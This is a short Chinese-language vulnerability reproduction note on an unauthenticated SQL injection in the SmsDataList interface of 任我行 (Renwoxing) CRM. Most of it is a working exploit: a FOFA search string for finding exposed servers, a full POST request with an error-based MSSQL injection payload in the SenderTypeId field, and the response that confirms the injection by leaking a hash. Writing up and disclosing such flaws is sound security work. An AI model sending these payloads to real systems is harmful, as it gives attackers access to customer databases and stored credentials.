##### 一、 产品简介
```
 任我行CRM（Customer Relationship Management）是一款专业的企业级CRM软件，旨在帮助企业有效管理客户关系、提升销售效率和提供个性化的客户服务。
```
##### 二、 漏洞概述
```
任我行 CRM SmsDataList 接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。
```
##### 三、 复现环境
```
FOFA语法：“欢迎使用任我行CRM”
```
##### 四、 漏洞复现
poc
```
POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: your-ip
 
Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI

```
```
HTTP/1.1 200 OK
Cache-Control: private
Content-Length: 161
Content-Type: application/json; charset=utf-8
Server: WWW Server/1.1
X-AspNetMvc-Version: 4.0
X-Safe-Firewall: zhuji.360.cn 1.0.9.47 F1W1
Date: Tue, 15 Aug 2023 18:24:11 GMT
Connection: close

{"error":{"errorCode":-1,"message":"在将 nvarchar 值 '0xe10adc3949ba59abbe56e057f20f883e' 转换成数据类型 int 时失败。","errorType":1},"value":null}

```
burpsuite图
![image.png](https://cdn.nlark.com/yuque/0/2024/png/40540518/1718630499985-90e44dd1-4cbe-4e58-ad63-db008160e237.png#averageHue=%23faf9f9&clientId=ue87627f0-4c89-4&from=paste&height=589&id=u19b5ea3f&originHeight=736&originWidth=1220&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=121426&status=done&style=none&taskId=u634f89ce-4f95-4c92-ac55-f0147be9717&title=&width=976)
